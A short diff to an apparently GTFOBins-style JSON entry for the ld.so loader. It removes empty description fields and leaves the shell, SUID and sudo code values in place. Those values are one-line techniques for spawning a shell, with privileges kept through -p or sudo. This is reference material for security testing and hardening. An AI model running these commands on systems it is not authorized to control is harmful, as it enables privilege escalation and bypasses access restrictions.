@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "/lib/ld.so /bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./ld.so /bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo /lib/ld.so /bin/sh\n"
       }
     ]
